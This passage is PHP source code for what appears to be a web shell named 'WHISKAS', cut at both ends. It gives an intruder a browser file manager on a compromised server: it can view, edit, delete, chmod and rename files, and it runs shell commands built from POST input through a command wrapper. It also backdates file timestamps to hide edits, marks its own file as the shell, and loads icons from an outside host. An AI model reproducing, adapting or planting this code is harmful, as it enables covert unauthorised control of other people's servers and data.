'modify' => $file_modify,
'perms' => $file_perm,
'size' => $file_size,
'owner' => $file_owner,
'group' => $file_group
);
if($filename == ".." && !$cmd_dir){
	$tmp["path"] = str_replace("\\", "/", realpath($file_path));
}
if(!$cmd_dir){
if(@is_file($file_path)){
$arr_mrg = array('type' => 'file');
if(@is_link($file_path)){
$arr_mrg["link"] = readlink($tmp['path']);
}
$files[] = array_merge($tmp, $arr_mrg);
}elseif(@is_link($file_path)){
$dirs[] = array_merge($tmp, array('type' => 'link', 'link' => readlink($tmp['path'])));
}elseif(@is_dir($file_path)&& ($filename != ".")){
$dirs[] = array_merge($tmp, array('type' => 'dir'));
}
}else{
	if($dirContent[$i]["type"]=="file"){
		$files[] = array_merge($tmp, array('type' => 'file'));
	}else{
		if($dirContent[$i]["name"] != "."){
			$dirs[] = array_merge($tmp, array('type' => 'dir'));
		}
	}
}
}
$GLOBALS['sort'] = $sort;
function WHISKASCmp($a, $b) {
if($GLOBALS['sort'][0] != 'size')
return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1);
else
return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
}
usort($files, "WHISKASCmp");
usort($dirs, "WHISKASCmp");
if(isset($_COOKIE["WHISKAS_filesman_direction"])&& !empty($_COOKIE["WHISKAS_filesman_direction"])){
	if($_COOKIE["WHISKAS_filesman_direction"] == 'desc'){
		$files = array_reverse($files);
		$dirs = array_reverse($dirs);
	}
}
$files = array_merge($dirs, $files);
$l=0;
$cc=0;
foreach($files as $f){
$f['name'] = htmlspecialchars($f['name']);
$newname = mb_strlen($f['name'], 'UTF-8')>60?mb_substr($f['name'], 0, 60, 'utf-8').'...':$f['name'];
$checkbox = 'checkbox_'.$checkbox_rand.$cc;
$raw_name = rawurlencode($f['name']);
$icon = $GLOBALS['DB_NAME']['show_icons']?'<img src="'.findicon($f['name'],$f['type']).'" width="30" height="30">':'';
$style = $GLOBALS['DB_NAME']['show_icons']?'position:relative;display:inline-block;bottom:12px;':'';
echo '<tr class="fmanager-row" id="tr_row_'.$cc.'"><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="'.$raw_name.'" class="chkbx" id="'.$checkbox .'"><label for="'.$checkbox .'"></label></div></td><td id="td_row_'.$cc.'">'.$icon.'<div style="'.$style.'"><a row="'.$cc.'" id="id_'.$cc.'" class="main_name" onclick="'.(($f['type']=='file')?'editor(\''.$raw_name.'\',\'auto\',\'\',\'\',\'\',\''.$f['type'].'\');" href="#action=fileman&path='.$GLOBALS['cwd'].'&file='.$raw_name.'" fname="'.$raw_name.'" ftype="file" path="'.$GLOBALS['cwd'].'" opt_title="'.$f['link'].'" '.(isset($f['link'])?'onmouseover="showSymlinkPath(this,event);" onmouseout="hideSymlinkPath(this,event);"':'').'>'.($GLOBALS['cwd'].$f['name']==$GLOBALS['__file_path']?"<span class='shell_name' style='font-weight:unset;'>".$f['name']."</span>":htmlspecialchars($newname)):'g(\'FilesMan\',\''.$f['path'].'\');" href="#action=fileman&path='.$f['path'].'" fname="'.$raw_name.'" ftype="folder" path="'.$GLOBALS['cwd'].'" opt_title="'.$f['link'].'" '.(isset($f['link'])?'onmouseover="showSymlinkPath(this,event);" onmouseout="hideSymlinkPath(this,event);"':'').'><b>| ' . htmlspecialchars($f['name']) . ' |</b>').'</a></td></div><td><span style="font-weight:unset;" class="main_size">'.(($f['type']=='file')?(isset($f['link'])?'[L] ':'').WHISKASSize($f['size']):$f['type']).'</span></td><td><span style="font-weight:unset;" class="main_modify">'.$f['modify'].'</span></td><td><span style="font-weight:unset;" class="main_owner_group">'.$f['owner'].'/'.$f['group'].'</span></td><td><a id="id_chmode_'.$cc.'" href=javascript:void(0) onclick="editor(\''.$raw_name.'\',\'chmod\',\'\',\'\',\'\',\''.$f['type'].'\')">'.
$f['perms'].'</td><td><a id="id_rename_'.$cc.'" title="Rename" class="actions" href="javascript:void(0);" onclick="editor(\''.$raw_name.'\', \'rename\',\'\',\'\',\'\',\''.$f['type'].'\')">R</a> <a id="id_touch_'.$cc.'" title="Modify Datetime" class="actions" href="javascript:void(0);" onclick="editor(\''.$raw_name.'\', \'touch\',\'\',\'\',\'\',\''.$f['type'].'\')">T</a>'.(($f['type']=='file')?' <a id="id_edit_'.$cc.'" class="actions" title="Edit" href="javascript:void(0);" onclick="editor(\''.$raw_name.'\', \'edit\',\'\',\'\',\'\',\''.$f['type'].'\')">E</a> <a id="id_download_'.$cc.'" title="Download" class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\''.$raw_name.'\', \'download\')">D</a>':'').'<a id="id_delete_'.$cc.'" title="Delete" class="actions" href="javascript:void(0);" onclick="var chk = confirm(\'Are You Sure For Delete # '.addslashes(rawurldecode($f['name'])).' # ?\'); chk ? g(\'FilesMan\',null,\'delete\', \''.$raw_name.'\') : \'\';"> X </a></td></tr>';
$l = $l?0:1;
$cc++;
}
echo "<tr id='filemanager_last_tr'><td colspan=7>
<input type=hidden name=a value='FilesMan'>
<input type=hidden name=c value='".htmlspecialchars(($GLOBALS['glob_chdir_false']?$_POST['c']:$GLOBALS['cwd']))."'>
<input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'')."'>
<select id='tools_selector' name='WHISKAS1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete' selected>Delete</option><option value='zip'>Add 2 Compress (zip)</option><option value='unzip'>Add 2 Uncompress (zip)</option><option value='paste'>Paste / Zip / Unzip </option></select>
<input type='submit' value=' '>
</form></table><div class='pages-holder'><div class='pages-number'>".$page_builder."</div></div></div></div>";
WHISKASfooter();
}
function get_pagination_links($current_page, $total_pages){
    $links = "";
    if ($total_pages >= 1 && $current_page <= $total_pages) {
		$links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number\"><<</a>";
		$selected_page = "";
		if($current_page == 1){
			$selected_page = " active-page-number";
		}
        $links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number".$selected_page."\">1</a>";
        $i = max(2, $current_page - 5);
        if ($i > 2)
            $links .= "<a class=\"page-number\">...</a>";
        for (; $i < min($current_page + 6, $total_pages); $i++) {
			if($i == $current_page){
				$selected_page = " active-page-number";
			}else{
				$selected_page = "";
			}$links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number".$selected_page."\">{$i}</a>";
        }
        if ($i != $total_pages)
            $links .= "<a class=\"page-number\">...</a>";
		$selected_page = " last-page-number";
		if($current_page == $total_pages){
			$selected_page .= " active-page-number";
		}
        $links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number".$selected_page."\">{$total_pages}</a>";
		$links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number\">>></a>";
    }
    return $links;
}
function WHISKASFilesTools(){
WHISKAShead();
echo '<div class="filestools" style="height: 100%;">';
if(isset($_POST['WHISKAS1']))$_POST['WHISKAS1'] = rawurldecode($_POST['WHISKAS1']);
$WHISKAS1_decoded = $_POST['WHISKAS1'];
$chdir_fals = false;
if(!@chdir($_POST['c'])){
	$chdir_fals = true;
	$_POST['WHISKAS1'] = $_POST["c"]."/".$_POST["WHISKAS1"];
	$WHISKAS_canruncmd = _WHISKAS_can_runCommand(true,true);
	if($WHISKAS_canruncmd){
		$slashed_WHISKAS1 = addslashes($_POST['WHISKAS1']);
		$file_info = explode(":", WHISKASEx('stat -c "%F:%U:%G:%s:%Y:0%a:%A" "'.$slashed_WHISKAS1.'"'));
		$perm_color_class = WHISKASEx("if [[ -w '".$slashed_WHISKAS1."' ]]; then echo main_green_perm; elif [[ -r '".$slashed_WHISKAS1."' ]]; then echo main_white_perm; else echo main_red_perm; fi");
	}
}
if($_POST['WHISKAS2'] == 'auto'){
if(is_array(@getimagesize($_POST['WHISKAS1']))){
$_POST['WHISKAS2'] = 'image';
}else{
	$_POST['WHISKAS2'] = 'view';
	if($chdir_fals){
		if($WHISKAS_canruncmd){
			$mime = explode(":", WHISKASEx("file --mime-type '".addslashes($_POST['WHISKAS1'])."'"));
			$mimetype = $mime[1];
			if(!empty($mimetype)){
				if(strstr($mimetype, "image")){
					$_POST['WHISKAS2'] = 'image';
				}
			}
		}
	}
}
}
if($_POST['WHISKAS2'] == "rename" && !empty($_POST['WHISKAS3']) && @is_writable($_POST['WHISKAS1'])){$rename_cache = $_POST['WHISKAS3'];}
if(@$_POST['WHISKAS2'] == 'mkfile'){
$_POST['WHISKAS1'] = trim($_POST['WHISKAS1']);
if($chdir_fals&&$WHISKAS_canruncmd){
	if(_WHISKAS_is_writable($_POST["c"])){
		WHISKASEx("cd '".addslashes($_POST["c"])."';touch '".addslashes($WHISKAS1_decoded)."'");
		$_POST['WHISKAS2'] = "edit";
	}
}
if(!@file_exists($_POST['WHISKAS1'])){
$fp = @fopen($_POST['WHISKAS1'], 'w');
if($fp){
$_POST['WHISKAS2'] = "edit";
fclose($fp);
}
}else{
$_POST['WHISKAS2'] = "edit";
}
}
if(!_WHISKAS_file_exists(@$_POST['WHISKAS1'])){
echo __pre()."<center><p><div class=\"txtfont\"><font color='red'>!...FILE DOEST NOT EXITS...!</font></div></p></center></div><script>editor_error=false;removeHistory('".$_POST['WHISKAS4']."');</script>";
WHISKASFooter();
return;
}
if($chdir_fals){
$filesize = $file_info[3];
$uid["name"] = $file_info[1];
$gid["name"] = $file_info[2];
$permcolor = WHISKASPermsColor(array("class"=>$perm_color_class,"num"=>$file_info[5],"human"=>$file_info[6]),true);
}else{
$uid = function_exists("posix_getpwuid")&&function_exists("fileowner")?@posix_getpwuid(@fileowner($_POST['WHISKAS1'])):'';
$gid = function_exists("posix_getgrgid")&&function_exists("filegroup")?@posix_getgrgid(@filegroup($_POST['WHISKAS1'])):'';
if(!$uid&&!$gid){
$uid['name'] = function_exists("fileowner")?@fileowner($_POST['WHISKAS1']):'';
$gid['name'] = function_exists("filegroup")?@filegroup($_POST['WHISKAS1']):'';
}
$permcolor = WHISKASPermsColor($_POST['WHISKAS1']);
$filesize = @filesize($_POST['WHISKAS1']);
if(!isset($uid['name'],$gid['name'])||empty($uid['name'])||empty($gid['name'])){
	if(_WHISKAS_can_runCommand()){
		list($uid['name'],$gid['name']) = explode(":", WHISKASEx('stat -c "%U:%G" "'.addslashes($_POST["c"]."/".$_POST["WHISKAS1"]).'"'));
	}
}
}
if(substr($_POST['WHISKAS1'], 0, 7) == "phar://"){
	$WHISKAS_file_directory = $_POST['WHISKAS1'];
}else{
	$WHISKAS_file_directory = str_replace("//", "/",($chdir_fals?"":$_POST['c'].'/').$_POST['WHISKAS1']);
}
echo '<div style="overflow: hidden;white-space: nowrap;text-overflow: ellipsis;"><span class="editor_file_info_vars">Name:</span> '.htmlspecialchars(basename($WHISKAS1_decoded)).' <span class="editor_file_info_vars">Size:</span> '.WHISKASSize($filesize).' <span class="editor_file_info_vars">Permission:</span> '.$permcolor.' <span class="editor_file_info_vars">Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].' <span class="editor_file_info_vars">Directory:</span> '.dirname($WHISKAS_file_directory).'</div>';
if(empty($_POST['WHISKAS2']))$_POST['WHISKAS2'] = 'view';
if(!_WHISKAS_is_dir($_POST['WHISKAS1'])){
$m = array('View', 'Download', 'Highlight', 'Chmod', 'Rename', 'Touch', 'Delete', 'Image', 'Hexdump');
$ftype = "file";
}else{
$m = array('Chmod', 'Rename', 'Touch');
$ftype = "dir";
}
echo('<div>');
foreach($m as $v)
echo $v == 'Delete' ? '<a href="javascript:void(0);" onclick="var chk=confirm(\'Are You Sure For Delete This File ?\');chk?editor(\''.addslashes(!isset($rename_cache)?$_POST['WHISKAS1']:$rename_cache).'\',\''.strtolower($v).'\',\'\',\''.$_POST['c'].'\',\''.$_POST['WHISKAS4'].'\',\''.$ftype.'\'):\'\';"><span class="editor_actions">'.((strtolower($v)==@$_POST['WHISKAS2'])?'<b><span class="editor_actions"> '.$v.' </span> </b>':$v).' | </span></a> ' : '<a href="javascript:void(0);" onclick="editor(\''.addslashes(!isset($rename_cache)?$_POST['WHISKAS1']:$rename_cache).'\',\''.strtolower($v).'\',\'\',\''.$_POST['c'].'\',\''.$_POST['WHISKAS4'].'\',\''.$ftype.'\')"><span class="editor_actions">'.((strtolower($v)==@$_POST['WHISKAS2'])?'<b><span class="editor_actions"> '.$v.' </span> </b>':$v).' | </span></a>';
echo '</div>';
switch($_POST['WHISKAS2']){
case 'view':case 'edit':
@chdir($_POST['c']);
$disabled_btn = "";
if(!@is_writable($_POST['WHISKAS1'])&&!_WHISKAS_is_writable($_POST['WHISKAS1'])){
$disabled_btn = "disabled=disabled";
$disabled_btn_style= 'background: #ff0000;color: #fff;';
}
if(!empty($_POST['WHISKAS3'])){
$_POST['WHISKAS3'] = substr($_POST['WHISKAS3'],1);
$time = @filemtime($_POST['WHISKAS1']);
$fp = @__write_file($_POST['WHISKAS1'],$_POST['WHISKAS3']);
if($chdir_fals&&$WHISKAS_canruncmd){
	$rname = $WHISKAS1_decoded;
	$randname = $rname.rand(111,9999);
	$filepath = dirname($_SERVER["SCRIPT_FILENAME"])."/".$randname;
	if($fp = @__write_file($filepath ,$_POST['WHISKAS3'])){
		WHISKASEx("mv '".addslashes($filepath)."' '".addslashes($_POST["WHISKAS1"])."';rm -f '".addslashes($filepath)."'");
	}
}
if($fp){
echo 'Saved!<br>';
@touch($_POST['WHISKAS1'],$time,$time);
}
}
echo '<div class="editor-view"><div class="view-content"><div style="display:inline-block;margin-bottom:10px;"><button onclick="var ta=document.getElementById(\'file_textarea\');editor(\''.addslashes($WHISKAS1_decoded).'\',\'edit\',\'1\'+ta.value,\''.$_POST['c'].'\',\''.$_POST['WHISKAS4'].'\',\''.$ftype.'\');return false;" class="button" style="width:100px;height:33px;background:linear-gradient(to bottom, #1ced31 0, #005b09 55%, #134306 100%);color:#FFF;'.$disabled_btn_style.'" '.$disabled_btn.'>Save</button></div><textarea id="file_textarea" style="width:100%;height:80vh;background:#1a1a1a;color:#0f0;font-family:monospace;font-size:14px;padding:10px;border:1px solid #333;">';
echo htmlspecialchars(__read_file($_POST['WHISKAS1']));
echo '</textarea></div></div>';
break;
case 'highlight':
@chdir($_POST['c']);
if(@is_readable($_POST['WHISKAS1'])){
echo '<div class="editor-view"><div class="view-content"><div class="ml1" style="background-color: #e1e1e1;color:black;font-weight:bold;">';
$code = @highlight_file($_POST['WHISKAS1'],true);
echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$code).'</div></div></div>';
}
break;
case 'delete':
@chdir($_POST['c']);
if(@is_writable($_POST['WHISKAS1'])||$GLOBALS["glob_chdir_false"]){
$deleted = true;
if(!@unlink($_POST['WHISKAS1'])){
	$deleted = false;
	if($WHISKAS_canruncmd){
		if(_WHISKAS_is_writable($_POST['WHISKAS1'])){
			WHISKASEx("rm -f '".addslashes($_POST['WHISKAS1'])."'");
			$deleted = true;
		}
	}
}
if($deleted)echo 'File Deleted...<script>var elem = $("'.$_POST['WHISKAS4'].'").parentNode;elem.parentNode.removeChild(elem);delete editor_files["'.$_POST['WHISKAS4'].'"];</script>';else echo 'Error...';}
break;
case 'chmod':
@chdir($_POST['c']);
if(!empty($_POST['WHISKAS3'])){
$perms = 0;
for($i=strlen($_POST['WHISKAS3'])-1;$i>=0;--$i)
$perms += (int)$_POST['WHISKAS3'][$i]*pow(8, (strlen($_POST['WHISKAS3'])-$i-1));
if(!@chmod($_POST['WHISKAS1'], $perms)){
if($chdir_fals&&$WHISKAS_canruncmd){
WHISKASEx("cd '".addslashes($_POST["c"])."';chmod ".addslashes($_POST['WHISKAS3'])." '".addslashes($WHISKAS1_decoded)."'");
echo('Success!');
}else{
echo '<font color="#000000"><b>Can\'t set permissions!</b></font><br><script>document.mf.WHISKAS3.value="";</script>';}
}else{echo('Success!');}
}
clearstatcache();
WHISKASNum(8,9,10,7,6,5,4,2,1);
if($chdir_fals){
	$file_perm = $file_info[5];
}else{
	$file_perm = substr(sprintf('%o', @fileperms($_POST['WHISKAS1'])),-4);
}
echo '<script>WHISKAS3_="";</script><form onsubmit="editor(\''.addslashes($_POST['WHISKAS1']).'\',\''.$_POST['WHISKAS2'].'\',this.chmod.value,\''.$_POST['c'].'\',\''.$_POST['WHISKAS4'].'\',\''.$ftype.'\');return false;"><input type="text" name="chmod" value="'.$file_perm.'"><input type=submit value=" "></form>';
break;
case 'hexdump':
@chdir($_POST['c']);
$c = __read_file($_POST['WHISKAS1']);
$n = 0;
$h = array('00000000<br>','','');
$len = strlen($c);
for ($i=0; $i<$len; ++$i) {
$h[1] .= sprintf('%02X',ord($c[$i])).' ';
switch ( ord($c[$i]) ) {
case 0: $h[2] .= ' '; break;
case 9: $h[2] .= ' '; break;
case 10: $h[2] .= ' '; break;
case 13: $h[2] .= ' '; break;
default: $h[2] .= $c[$i]; break;
}
$n++;
if ($n == 32) {
$n = 0;
if ($i+1 < $len) {$h[0] .= sprintf('%08X',$i+1).'<br>';}
$h[1] .= '<br>';
$h[2] .= "\n";
}
}
echo '<div class="editor-view"><div class="view-content"><table cellspacing=1 cellpadding=5 bgcolor=black><tr><td bgcolor=gray><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#282828><pre>'.$h[1].'</pre></td><td bgcolor=#333333><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table></div></div>';
break;
case 'rename':
@chdir($_POST['c']);
$WHISKAS1_escape = addslashes($_POST["WHISKAS1"]);
$WHISKAS3_escape = addslashes($_POST["WHISKAS3"]);
if(!empty($_POST['WHISKAS3'])){
$cmd_rename = false;
if($chdir_fals&&$WHISKAS_canruncmd){
if(_WHISKAS_is_writable($_POST['WHISKAS1'])){
$WHISKAS1_escape = addslashes($WHISKAS1_decoded);
WHISKASEx("cd '".addslashes($_POST['c'])."';mv '".$WHISKAS1_escape."' '".addslashes($_POST['WHISKAS3'])."'");
}else{
$cmd_rename = true;
}
}else{
$WHISKAS1_escape = addslashes($_POST["WHISKAS1"]);
}
if(!@rename($_POST['WHISKAS1'], $_POST['WHISKAS3'])&&$cmd_rename){
echo 'Can\'t rename!<br>';}else{echo('Renamed!<script>try{$("'.$_POST['WHISKAS4'].'").innerHTML = "<div class=\'editor-icon\'>"+loadType(\''.$WHISKAS3_escape.'\',\''.$ftype.'\',\''.$_POST['WHISKAS4'].'\')+"</div><div class=\'editor-file-name\'>'.$WHISKAS3_escape.'</div>";editor_files["'.$_POST['WHISKAS4'].'"].file = "'.$WHISKAS3_escape.'";updateFileEditor("'.$WHISKAS1_escape.'", "'.$WHISKAS3_escape.'");'.($ftype == "dir"?"updateDirsEditor('".$_POST['WHISKAS4']."','".$WHISKAS1_escape."');":"").'}catch(e){console.log(e)}</script>');$WHISKAS1_escape = $WHISKAS3_escape;}
}
echo '<form onsubmit="editor(\''.$WHISKAS1_escape.'\',\''.$_POST['WHISKAS2'].'\',this.name.value,\''.$_POST['c'].'\',\''.$_POST['WHISKAS4'].'\',\''.$ftype.'\');return false;"><input type="text" name="name" value="'.addslashes(htmlspecialchars(isset($_POST['WHISKAS3'])&&$_POST['WHISKAS3']!=''?$_POST['WHISKAS3']:$WHISKAS1_decoded)).'"><input type=submit value=" "></form>';
break;
case 'touch':
@chdir($_POST['c']);
if( !empty($_POST['WHISKAS3']) ) {
$time = strtotime($_POST['WHISKAS3']);
if($time){
$touched = false;
if($chdir_fals&&$WHISKAS_canruncmd){
	WHISKASEx("cd '".addslashes($_POST["c"])."';touch -d '".htmlspecialchars(addslashes($_POST['WHISKAS3']))."' '".addslashes($WHISKAS1_decoded)."'");
	$touched = true;
}
if(!@touch($_POST['WHISKAS1'],$time,$time)&&!$touched)
echo 'Fail!';
else
echo 'Touched!';
} else echo 'Bad time format!';
}
clearstatcache();
echo '<script>WHISKAS3_="";</script><form onsubmit="editor(\''.addslashes($_POST['WHISKAS1']).'\',\''.$_POST['WHISKAS2'].'\',this.touch.value,\''.$_POST['c'].'\',\''.$_POST['WHISKAS4'].'\',\''.$ftype.'\');return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", ($chdir_fals?$file_info[4]:@filemtime($_POST['WHISKAS1']))).'"><input type=submit value=" "></form>';
break;
case 'image':
@chdir($_POST['c']);
echo('<hr>');
$file = $_POST['WHISKAS1'];
$image_info = @getimagesize($file);
if(is_array($image_info)||$chdir_fals){
$width = (int)$image_info[0];
$height = (int)$image_info[1];
if($chdir_fals&&$WHISKAS_canruncmd){
	$source = WHISKASEx("cat '".addslashes($file)."' | base64");
	list($width, $height) = explode(":", WHISKASEx("identify -format '%w:%h' '".addslashes($file)."'"));
	$mime = explode(":", WHISKASEx("file --mime-type '".addslashes($file)."'"));
	$image_info['mime'] = $mime[1];
}else{
	$source = __ZW5jb2Rlcg(__read_file($file, false));
}
$image_info_h = "Image type = <span>[</span> ".$image_info['mime']." <span>]</span><br>Image Size = <span>[ </span>".$width." x ".$height."<span> ]</span><br>";
if($width > 800){$width = 800;}
echo $content = "<div class='editor-view'><div class='view-content'><center>".$image_info_h."<br><img id='viewImage' style='max-width:100%;border:1px solid #FFFFFF8f;' src='data:".$image_info['mime'].";base64,".$source."' alt='".$file."'></center></div></div><br>";
}
break;
}
echo '</div>';
WHISKASFooter();
}
function findicon($file,$type){
$s = 'http://solevisible.com/icons/';
$types = array('json','ppt','pptx','xls','xlsx','msi','config','cgi','pm','c','cpp','cs','java','aspx','asp','db','ttf','eot','woff','woff2','woff','conf','log','apk','cab','bz2','tgz','dmg','izo','jar','7z','iso','rar','bat','sh','WHISKAS','gz','tar','php','php4','php5','phtml','html','xhtml','shtml','htm','zip','png','jpg','jpeg','gif','bmp','ico','txt','js','rb','py','xml','css','sql','htaccess','pl','ini','dll','exe','mp3','mp4','m4a','mov','flv','swf','mkv','avi','wmv','mpg','mpeg','dat','pdf','3gp','doc','docx','docm');
if($type!='file'){
return ($file=='..'?$s.'back.png':'data:image/png;base64,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